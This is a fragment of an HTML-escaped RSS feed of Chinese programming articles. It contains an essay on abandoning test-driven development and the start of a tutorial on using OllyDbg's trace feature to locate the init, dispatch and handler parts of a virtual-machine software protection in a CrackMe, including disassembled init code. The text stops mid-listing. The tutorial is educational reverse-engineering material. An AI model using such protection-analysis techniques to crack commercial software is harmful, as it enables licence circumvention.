&lt;a href=&quot;http://blog.jobbole.com/109827/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（33）：df 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109846/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（34）： du 命令&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109869&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109869votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109869&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Sat, 14 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-14-109869-01f301eb4.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-14-109869-01f301eb4.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>放弃测试优先式开发（TDD）</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;测试优先或测试驱动开发（TDD）是你在编写程序前先编写测试的软件开发方法。你编写程序来通过测试，扩展测试或增加测试然后再扩展程序功能来通过这些测试。你先花费时间建立一系列的测试，然后你可以在每次程序修改时自动运行测试。这是为了确保每时每刻程序都能够运行并通过测试。你周期性地重构你的程序来提高它的结构并让它易读易改。&lt;/p&gt;
&lt;p&gt;外界宣称测试优先式开发提高了测试覆盖率，并且在不改变现有功能基础上，能够更简单的改变程序。测试的作用就像文档一样，你有了一个关于程序应该做什么的详细又抽象的描述。&lt;/p&gt;
&lt;p&gt;几个月前，我谨慎的决定体验测试优先式开发。作为一个退休的程序员，我编写的是我私人的项目，而不是一个有文档说明的客户端。所以我在此所说的话或许仅仅适用于没有严格程序文档的情况。&lt;/p&gt;
&lt;p&gt;起初，我发现这个方法（测试驱动开发）很有用。但我开始实现一个 GUI 时，编写测试很困难，而且我认为编写测试所花费的时间并不值得。然后，我并没有完全（或许是不纯粹地）按照TDD的要求去实现，所以我没有对所有东西做自动化测试，有时在编写测试前就实现了一些东西。&lt;/p&gt;
&lt;p&gt;但是，我并不是因为编写 GUI 自动化测试的（众所周知的）困难而放弃 TDD 。我放弃是因为我认为它在编程中鼓励保守主义，它鼓励你设计能通过测试的决策，而不是符合用户的正确决策，它使你专注于细节而不是架构，并且它并不能适用于主要的一类程序问题——那些由意外的数据引起的问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;因为你想确保你总是可以通过大多数的测试，当你改变并扩展程序时你倾向于思考这一点。你因此不情愿做出会导致大量测试失败的大范围的变更。从心理上讲，你变得保守并避免破坏大量测试。&lt;/li&gt;
&lt;li&gt;往往对程序设计做测试比其他更容易。有时，最棒的设计是很难测试的，所以你不情愿采取这种方法，因为你知道你将花费大量时间设计并编写测试（对于我来说真的是一件无聊的事）。&lt;/li&gt;
&lt;li&gt;对于我来说最严重的问题是 TDD 鼓励专注于整理细节来通过测试，而不是把程序看做一个整体。我每次开始编程时只有有限的上机时间，并且需要花费时间审视并思考程序整体。我认为这带来优雅又优秀的结构化程序。但是 TDD 让你深入程序不同部分的细节，很少能够退后一步审视大局。&lt;/li&gt;
&lt;li&gt;根据我的经验，很多程序出现失败是因为处理的数据并不是程序所期待的。编写能够精确反映出你将要处理的坏数据的「坏数据」测试很困难，因为你需要成为一个领域专家并理解数据。「纯粹主义者」解决这点，当然，那就是你设计了数据校验检查，所以你不需要处理坏数据。但是现实中通常很难定义什么是「正确的数据」，并且有时你不得不处理你得到的数据而不是你预期的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以，我回到原点开始先写代码，然后写测试。我继续在有意义的地方做自动化测试，但在我能清楚读懂代码并理解它做什么的时候，我不会花费大量荒谬的时间编写测试。思考优先比测试优先是一条更好的路。&lt;/p&gt;
&lt;p&gt;附言。我很确定 TDD 纯粹主义者会说我做的不正确，所以没有真正从 TDD 受益。或许他们是对的。但是我还没有找到狂热者能够说服我。&lt;/p&gt;

        
            &lt;blockquote class=&quot;rewards&quot;&gt;
        &lt;p&gt;&lt;strong&gt;打赏支持我翻译更多好文章，谢谢！&lt;/strong&gt;&lt;/p&gt;
        &lt;a href=&quot;#rewardbox&quot; id=&quot;rewards-button&quot; class=&quot;fancybox&quot;&gt;&lt;span class=&quot;btn-bluet-blue href-style&quot;&gt;&lt;i class=&quot;fa fa-jpy&quot;&gt;&lt;/i&gt; 打赏译者&lt;/span&gt;&lt;/a&gt;
    &lt;/blockquote&gt;

    &lt;div id=&quot;rewardbox&quot;&gt;
        &lt;h4&gt;打赏支持我翻译更多好文章，谢谢！&lt;/h4&gt;
                &lt;p&gt;任选一种支付方式&lt;/p&gt;
                
    &lt;/div&gt;

    
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109861&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109861votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109861&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/snowhere&quot;&gt;孙腾浩&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/snowhere&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/cd4270c3da00a9dc353237b47a9bd160.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            write the code, change the world.        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/snowhere&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/snowhere/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/snowhere/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 10&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;http://snowhere.me/&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;QQ：459904593&quot; target=&quot;_blank&quot; href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-qq&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;GitHub主页&quot; target=&quot;_blank&quot; href=&quot;https://github.com/Snowhere/&quot;&gt;&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Sat, 14 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-14-109861-ae883fd33.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-14-109861-ae883fd33.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>如何用 OllyDbg 的跟踪功能分析虚拟机保护</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;虚拟机保护已经是现代保护壳不可缺少的一环，虽然逆向方也发展出各种插件帮助分析，但只针对特定某款，通用性的方法却不多见。我总在想，既然虚拟机的结构是固定的，如果有一款工具能够记录指令流，那么按图索骥，也许能发展出一套通用的分析方法来。其实OD（OllyDbg）就有记录指令流的功能，叫跟踪（trace），也许是效果不好或者操作不便，用的人甚至知道的人不多。先介绍下怎么用。&lt;/p&gt;
&lt;p&gt;OD的跟踪功能原理很简单，就是每一步都自动下单步断点，然后记录断下来的指令信息。这项功能涉及到几项设置，第一项是缓存大小，不难想象，跟踪得到的这一些列的指令记录是需要占地方存储的，占多大可以设置，位置在调试选项（Debugging options）-&amp;gt;跟踪（Trace），如图1。&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109805 aligncenter&quot; src=&quot;/images/jobbole.com/e0170004918392e4b4ef0f2214e5168d.jpg&quot; alt=&quot;file0001&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图1&lt;/p&gt;
&lt;p&gt;第一项就是缓存的大小，内存允许的话，自然是多多益善，毕竟缓存越大，允许记录的信息越多。第二项是记录的内容，跟踪会自动记录地址模块等信息，此外可以选择是否记录指令、ESP和标志位的信息。设置位置紧接着缓存大小，见图2，可以按需勾选，本文只需要记录指令即可。最后一项是在调试（DEBUG）菜单中打开Trace。&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109806 aligncenter&quot; src=&quot;/images/jobbole.com/b8b71adaf1e5f994d11ed078a86e158a.jpg&quot; alt=&quot;file0002&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图2&lt;/p&gt;
&lt;p&gt;现在Trace已经设置完毕了，按下Ctrl+F12，查看Trace窗口，应该已经开始记录执行过的指令。否则请检查前述设置和操作是否正确。&lt;/p&gt;
&lt;p&gt;那么，虚拟机保护要怎么入手分析呢？前面我提到，虚拟机是有固定结构的，既然要分析，那对应的找到这些结构应该就可以了。传统保护虚拟机的结构其实很简单，大致可以看成一只章鱼，有三个部分，分别是init（头），Dispatch（身）和Handle（触须），如图3：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109807 aligncenter&quot; src=&quot;/images/jobbole.com/6562f3af78e67b8ec5fe0e36c488386b.jpg&quot; alt=&quot;file0003&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图3&lt;/p&gt;
&lt;p&gt;Init主要完成虚拟机初始化工作，例如申请内存填写初始值之类，每次进入虚拟机，这个“头部”通常只执行一次。Dispatch是虚拟机的主体，可以看成一个主循环，它是每一条虚拟机指令的开始之处，也是结束之处，负责读取虚拟机指令，进入具体handle解释等工作。Handle就是虚拟机的“指令”了，实际完成各项虚拟机指令的功能。 我曾写过一篇《基于虚拟机的软件保护技术》较为详细的介绍过虚拟机保护技术，对基本结构还不太熟的同学，此文会对上述概念有更详细的说明。&lt;/p&gt;
&lt;p&gt;现在，我们就要在具体的软件中找这只“章鱼”了。以一个CrackMe为例，首先清理所有断点，打开Trace，Ctrl+F12跟踪步过运行，看到程序跑起来了，F12暂停，看Trace的窗口如下（图4）：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109808 aligncenter&quot; src=&quot;/images/jobbole.com/33e7b29b02e48b193620651bfe92a71e.jpg&quot; alt=&quot;file0004&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图4&lt;/p&gt;
&lt;p&gt;记录是从下往上看的，可以看出，在程序空间的最后一条支流，是00401534的一个call，调用了DialogBoxInDirectParamA，这是一个调出系统对话框的API，其中有一个参数DlgProc用来指明消息回调函数的位置，我们直接在反汇编窗口查看这个API，发现回调函数是0x401572（图5）：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109809 aligncenter&quot; src=&quot;/images/jobbole.com/f010ed61b59521f143ad473ebb82b70a.jpg&quot; alt=&quot;file0005&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图5&lt;/p&gt;
&lt;p&gt;0x401572处代码不长，有好几条Call，但大部分都是系统Call，只有一处调用了程序空间的函数，这个函数就是虚拟机的入口。到这里，我们对虚拟机的分析的工作才刚刚开始。&lt;/p&gt;
&lt;p&gt;首先对虚拟机的入口下断，然后重新运行程序。目的是保证能够正确找到init。现在应该端在虚拟机的入口处，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;size-medium wp-image-109810 aligncenter&quot; src=&quot;/images/jobbole.com/50f83e1fac2a0a9f7f4fedb362caf239.jpg&quot; alt=&quot;file0006&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图6&lt;/p&gt;
&lt;p&gt;这是个非常简单的虚拟机，有经验的同学也许可以一眼就看出来图6包含了Init和Dispatch分别在哪里。当然也可以用Trace快速找出虚拟机的各个结构。现在去掉断点，打开Trace，Ctrl+F12跟踪步过，这时程序会跑起来，多点击几下按钮，目的是让主要分支得到更充分的执行（即增加获得执行的次数），然后F12暂停。回到Trace窗口，对着任意一行程序空间的指令点击右键，选择模块统计，结果如下图：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-109811 aligncenter&quot; src=&quot;/images/jobbole.com/79b8aa741e41b434e54f4e84e24b4978.jpg&quot; alt=&quot;file0007&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;图7&lt;/p&gt;
&lt;p&gt;统计是以代码段来划分的，第一栏显示的是这段代码在刚才的跟踪执行中执行的次数，第二栏显示了某个代码段的首地址。我们先找执行了一次的指令首地址。可以找到第5行的地址就是虚拟机的入口地址，点击在反汇编窗口跟随，可以看到这段代码是从0x00401060到0x004010B9，这就是init：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b0da9d4801629585395&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Assembly (x86)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
00401060 $ 55 push ebp
00401061 . 8BEC mov ebp, esp
00401063 . 81C4 D0FEFFFF add esp, -0x130
00401069 . C745 E4 00000&amp;gt;mov dword ptr [ebp-0x1C], 0x0
00401070 . C745 E8 00000&amp;gt;mov dword ptr [ebp-0x18], 0x0
00401077 . C745 F1 00000&amp;gt;mov dword ptr [ebp-0xF], 0x0
0040107E . C645 FD 00 mov byte ptr [ebp-0x3], 0x0
00401082 . C645 FE 00 mov byte ptr [ebp-0x2], 0x0
00401086 . C745 F5 00000&amp;gt;mov dword ptr [ebp-0xB], 0x0
0040108D . 8D85 D0FEFFFF lea eax, dword ptr [ebp-0x130]
00401093 . 8945 F1 mov dword ptr [ebp-0xF], eax
00401096 . 8B45 14 mov eax, dword ptr [ebp+0x14]
00401099 . 8945 E0 mov dword ptr [ebp-0x20], eax
0040109C . 8B45 08 mov eax, dword ptr [ebp+0x8]
0040109F . 8945 D0 mov dword ptr [ebp-0x30], eax
004010A2 . 8B45 0C mov eax, dword ptr [ebp+0xC]
004010A5 . 8945 D8 mov dword ptr [ebp-0x28], eax
004010A8 . C745 DC 00000&amp;gt;mov dword ptr [ebp-0x24], 0x0
004010AF . C745 D4 00000&amp;gt;mov dword ptr [ebp-0x2C], 0x0
004010B6 . 8B45 10 mov eax, dword ptr [ebp+0x10]
004010B9 . 8945 EC mov dword ptr [ebp-0x14], eax&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4801629585395-21&quot;&gt;21&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-1&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401060&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;push&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-2&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401061&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8BEC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;esp&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-3&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401063&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;81C4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;D&lt;/span&gt;0&lt;span class=&quot;crayon-v &quot;&gt;FEFFFF&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;add&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x130&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-4&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401069&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;E&lt;/span&gt;4&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x1C&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-5&quot;&gt;
